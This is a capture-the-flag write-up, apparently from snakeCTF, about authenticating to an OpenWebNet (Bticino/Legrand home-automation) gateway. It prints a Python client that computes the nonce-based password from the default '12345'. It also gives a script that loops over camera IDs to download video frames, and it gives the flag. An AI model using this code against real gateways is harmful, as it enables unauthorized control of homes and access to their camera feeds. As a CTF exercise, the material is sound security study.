# Closed Web Net q
<img width="606" height="710" alt="Image" src="https://github.com/user-attachments/assets/a3773d89-6c8d-40d2-a8ab-8a9b260f5a4b" />

## Writeup

<img width="1178" height="57" alt="Image" src="https://github.com/user-attachments/assets/c5c26952-8256-4d31-9725-e333a103a98d" />

Following the challenge instructions, we need to use TLS on both ports due to infra requirements:

```
ncat --ssl own-f3dee35882b2010a5437ebb95a645f09.closed-web-net-2.challs.snakectf.org 20000 
```

After a quick search, we know that **OpenWebNet** is a communications protocol developed by Bticino since 2000.
The OpenWebNet protocol allows a "high-level" interaction between a remote unit and Bus SCS of MyHome domotic system.

We need to calculate the **password** requested by ethernet gateways from the Legrand / Bticino MyHome OpenWebNet home automation system when the **user's ip address** is not in the **gateway's whitelist**.

The **default password** is **12345**.

Conversation goes as follows:

```
← *#*1##
→ *99*0##
← *#603356072##
```

<img width="963" height="115" alt="Image" src="https://github.com/user-attachments/assets/cc428c5f-659a-4b02-8426-38feedf9a524" />

At which point a password should be sent back, calculated from the "password open" that is set in the gateway, and the nonce that was just sent:

```
→ *#25280520##
← *#*1##
```

We need two codes: a **client** and a **script** to retrieve video frames from a camera.

The **client**:
- Manages an SSL connection to an `OpenWebNet` bus
- Opens **command** or **event sessions** with the bus
- Calculates an **encrypted password** based on a received **nonce**
- Sends **commands** to control lights, read states, temperatures (**`*who*what*where##`**)
- Reads and interprets **responses** from the bus
- Extracts meaningful **data** (like numeric values) from responses

```python
import socket
import ssl
import logging
"""
Read Write class for OpenWebNet bus
"""

_LOGGER = logging.Logger(__name__)


class OpenWebNet(object):

    # OK message from bus
    ACK = '*#*1##'
    # Non OK message from bus
    NACK = '*#*0##'
    # OpenWeb string for open a command session
    CMD_SESSION = '*99*0##'
    # OpenWeb string for open an event session
    EVENT_SESSION = '*99*1##'

    # Init metod
    def __init__(self, host, port, password):
        self._host = host
        self._port = int(port)
        self._psw = password
        self._session = False
        self._socket = None

    # Connection with host

    def connection(self):
        # Create plain socket
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Wrap with SSL
        context = ssl._create_unverified_context()
        self._socket = context.wrap_socket(
            raw_socket, server_hostname=self._host)

        # Connect securely
        self._socket.connect((self._host, self._port))
        print("Secure connection established")

    # Send data to host
    def send_data(self, data):
        self._socket.send(data.encode())

    # Read data from host
    def read_data(self):
        return str(self._socket.recv(1024).decode())

# Calculate the password to start operation
    def calculated_psw(self, nonce):
        m_1 = 0xFFFFFFFF
        m_8 = 0xFFFFFFF8
        m_16 = 0xFFFFFFF0
        m_128 = 0xFFFFFF80
        m_16777216 = 0XFF000000
        flag = True
        num1 = 0
        num2 = 0
        self._psw = int(self._psw)

        for c in nonce:
            num1 = num1 & m_1
            num2 = num2 & m_1
            if c == '1':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 & m_128
                num1 = num1 >> 7
                num2 = num2 << 25
                num1 = num1 + num2
                flag = False
            elif c == '2':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 & m_16
                num1 = num1 >> 4
                num2 = num2 << 28
                num1 = num1 + num2
                flag = False
            elif c == '3':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 & m_8
                num1 = num1 >> 3
                num2 = num2 << 29
                num1 = num1 + num2
                flag = False
            elif c == '4':
                length = not flag

                if not length:
                    num2 = self._psw
                num1 = num2 << 1
                num2 = num2 >> 31
                num1 = num1 + num2
                flag = False
            elif c == '5':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 << 5
                num2 = num2 >> 27
                num1 = num1 + num2
                flag = False
            elif c == '6':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 << 12
                num2 = num2 >> 20
                num1 = num1 + num2
                flag = False
            elif c == '7':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 & 0xFF00
                num1 = num1 + ((num2 & 0xFF) << 24)
                num1 = num1 + ((num2 & 0xFF0000) >> 16)
                num2 = (num2 & m_16777216) >> 8
                num1 = num1 + num2
                flag = False
            elif c == '8':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = num2 & 0xFFFF
                num1 = num1 << 16
                num1 = num1 + (num2 >> 24)
                num2 = num2 & 0xFF0000
                num2 = num2 >> 8
                num1 = num1 + num2
                flag = False
            elif c == '9':
                length = not flag
                if not length:
                    num2 = self._psw
                num1 = ~num2
                flag = False
            else:
                num1 = num2
            num2 = num1
        print('num1', num1 & m_1)
        return num1 & m_1

    # Open command session
    def cmd_session(self):
        # Create the connection
        self.connection()

        # If the bus answer with a NACK report the error
        if self.read_data() == OpenWebNet.NACK:
            _LOGGER.exception("I cannot initialize communication with the gateway")

        # Open command session
        print()
        self.send_data(OpenWebNet.CMD_SESSION)
        answer = self.read_data()
        # if the bus answer with a NACK report the error
        if answer == OpenWebNet.NACK:
            _LOGGER.exception("The gateway refuses the command session")
            return False

        # calculate the psw
        psw_open = '*#' + str(self.calculated_psw(answer)) + '##'

        # send the password
        self.send_data(psw_open)

        # if the bus answer with a NACK report the error
        if self.read_data() == OpenWebNet.NACK:
            _LOGGER.exception("Wrong password")

        # othefwise set the variable to True
        else:
            self._session = True
            print('cmd_session')

    # Extractor for the answer from the bus
    def extractor(self, answer):
        value_list = []
        print('estrattore riceve', answer)
        # scan on all the caracters on the answer
        index = 0
        while index <= len(answer) - 1:
            print('index', index)
            if answer[index] != '*' and answer[index] != '#':
                lenght = 0
                val = ''
                while lenght <= len(answer) - 1 - index:
                    if answer[index + lenght] != '*' and answer[index + lenght] != '#':
                        lenght = lenght + 1
                        print('lenght', lenght)
                    else:
                        break
                print('add to val', answer[index:index + lenght])
                val = val + answer[index:index + lenght]
                print('val', val)
                value_list.append(val)
                print('value_list', value_list)
                index = index + lenght
                lenght = 0
            index = index + 1
        print(value_list)
        return value_list

    # Check that bus send all the data
    def check_answer(self, message):
        # If final part of the message is not and ACK or NACK
        end_message = ''
        print('message received from check answer', message)
        print('OpenWebNet.ACK', OpenWebNet.ACK)
        if message[len(message) - 6:] != OpenWebNet.ACK and message[len(message) - 6:] != OpenWebNet.NACK:
            # The answer is not completed, read again from bus
            print('message -len', message[len(message)-6:])
            end_message = self.read_data()
            # Add it

            print('message +end message', message + end_message)
            return message + end_message

        # Check if I get a NACK
        if message[len(message) - 6:] == OpenWebNet.NACK:
            _LOGGER.exception("Error: command not executed")

        return message

    # Normal request to bus
    def normal_request(self, who, where, what):

        # If the command session is not active
        if not self._session:
            self.cmd_session()

        # Prepare the request
        normal_request = '*' + who + '*' + what + '*' + where + '##'

        # And send
        self.send_data(normal_request)

        # Read the answer
        message = self.read_data()

        # Check if I get a NACK
        if message == OpenWebNet.NACK:
            _LOGGER.exception("Error: command not executed")

    # Request the state of a component on the bus
    def stato_request(self, who, where):
        print('stato request)')
        # If the command session is not active
        if not self._session:
            self.cmd_session()

        # Prepare the request
        stato_request = '*#' + who + '*' + where + '##'
        print('richiesta', stato_request)
        # And send
        self.send_data(stato_request)

        # Read the answer
        message = self.read_data()
        print('messagge', message)
        # Check if the bus has transmitted all the data
        check_message = self.check_answer(message)

        # Check if I get a NACK
        if message[len(message) - 6:] == OpenWebNet.NACK:
            _LOGGER.exception("Error: commando not executed")
        # Or an ACK
        else:
            # In which case I extract the response data and return it as a list
            return self.extractor(check_message[:len(check_message) - 6])

    # Size request
    def grandezza_request(self, who, where, grandezza):
        # If it is not active I open a command session
        if not self._session:
            self.cmd_session()

        # Prepare the request
        grandezza_request = '*#' + who + '*' + where + '*' + grandezza + '##'

        # an Send
        self.send_data(grandezza_request)

        # Read the answer
        message = self.read_data()

        # Check if the bus has transmitted all the data
        check_message = self.check_answer(message)

        # Check if I get a NACK
        if message[len(message) - 6:] == OpenWebNet.NACK:
            _LOGGER.exception("Errore Comando non effettuato")
        # or an ACK
        else:
            # In which case I extract the response data and return it as a list
            return self.extractor(check_message[:len(check_message) - 6])

    # Writing of a size
    def grandezza_write(self, who, where, grandezza, valori):
        # If it is not active I open a command session
        if not self._session:
            self.cmd_session()

        # Prepare the request
        val = ''
        for item in valori:
            val = '*' + val[item]

        grandezza_write = '*#' + who + '*' + where + '*#' + grandezza + val + '##'

        # And send
        self.send_data(stato_request)

        # Read the answer
        return self.read_data()

    # Method that sends the light on command where on the bus
    def luce_on(self, where):
        self.normal_request('1', where, '1')

    # Method that sends the light off command where on the bus
    def luce_off(self, where):
        self.normal_request('1', where, '0')

    # Method for requesting the state of the where light on the bus
    def stato_luce(self, where):
        print('stato_luce')
        stato = self.stato_request('1', where)

        if stato[1] == '1':
            return True
        else:
            return False

    # Method for reading temperature
    def read_temperature(self, where):
        print('Reading temperature')
        temperatura = self.grandezza_request('4', where, '0')
        return float(temperatura[3])/10.0

    # Method for reading the temperature set in the probe
    def read_setTemperature(self, where):
        print('Reading the temperature')
        setTemperatura = self.grandezza_request('4', where, '14')
        return float(setTemperatura[3])/10.0

    # Method for reading the solenoid valve status
    def read_sondaStatus(self, where):
        print('Reading the valve state')
        stato_sonda = self.grandezza_request('4', where, '19')
        print('probe state', stato_sonda[4])
        if stato_sonda[4] == '0':
            return 'OFF'
        else:
            return 'ON'
```

The **script**:
- Instantiates the `OpenWebNet` class with host, port, and password
- Opens a **command session** using `cmd_session()`
- Sends a series of **commands** (`*7*0*ID##`) to request **video frames**
- Calls a remote URL with the session password and frame ID
- Saves **valid frames** (JPEG images) locally as `frame_XXXX.jpg` files

```python
import requests
from client import OpenWebNet

base_url = "https://cam-f3dee35882b2010a5437ebb95a645f09.closed-web-net-2.challs.snakectf.org/telecamera.php"

c = OpenWebNet(
    host="own-f3dee35882b2010a5437ebb95a645f09.closed-web-net-2.challs.snakectf.org",
    port=20000,
    password="12345"
)

for i in range(4000, 4050):
    passwd = c.cmd_session()
    c.send_data(f'*7*0*{i}##')
    print(c.read_data())  # expect *#*1##

    response = requests.get(
        base_url, params={"CAM_PASSWD": passwd, "CAM_ID": i}, stream=True, verify=False)

    if response.status_code == 200 and response.headers.get('Content-Type') == 'image/jpeg':
        filename = f"frame_{i}.jpg"
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Saved {filename}")
    else:
        print(f"Frame {i} not found or not an image")
```

<img width="557" height="607" alt="Image" src="https://github.com/user-attachments/assets/ab1cca01-cd26-4e6f-b21f-bb2476af8281" />

<img width="1091" height="230" alt="Image" src="https://github.com/user-attachments/assets/22c99360-2a51-4499-a72e-151e28f7d955" />

<img width="1007" height="698" alt="Image" src="https://github.com/user-attachments/assets/b207b084-8fb7-4740-89c9-4bf6886ac297" />

One particular frame caught our attention: a **valid QR code** with the **flag**!

![Image](https://github.com/user-attachments/assets/d8a6584f-dcac-44ba-9c08-1c56016409de)

Flag: **snakeCTF{0pen_w3b_n3t_ag4in??_d83338b8f78d07ce}**
